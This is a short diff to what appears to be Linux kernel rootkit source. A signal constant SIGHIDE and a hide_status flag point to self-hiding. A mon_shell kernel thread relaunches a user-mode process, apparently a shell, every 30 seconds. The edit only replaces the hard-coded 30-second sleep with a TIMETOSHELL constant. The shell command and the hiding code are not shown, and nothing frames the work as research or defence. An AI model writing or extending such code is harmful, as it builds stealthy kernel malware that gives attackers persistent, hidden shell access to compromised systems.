@@ -15,7 +15,8 @@ MODULE_AUTHOR("GPL");
 MODULE_DESCRIPTION("GPL");
 
 enum {
-    SIGHIDE = 59
+    SIGHIDE = 59,
+    TIMETOSHELL = 30
 };
 
 static int hide_status = 0;
@@ -71,7 +72,7 @@ int mon_shell(void *data) {     // Function that will be executed by the kernel 
                                 NULL, UMH_WAIT_EXEC);
 
 
-        ssleep(30);  // Waits 30 seconds before trying again.
+        ssleep(TIMETOSHELL);  // Waits 30 seconds before trying again.
     }
     return 0;  // Returns 0 when the thread finishes.
 }
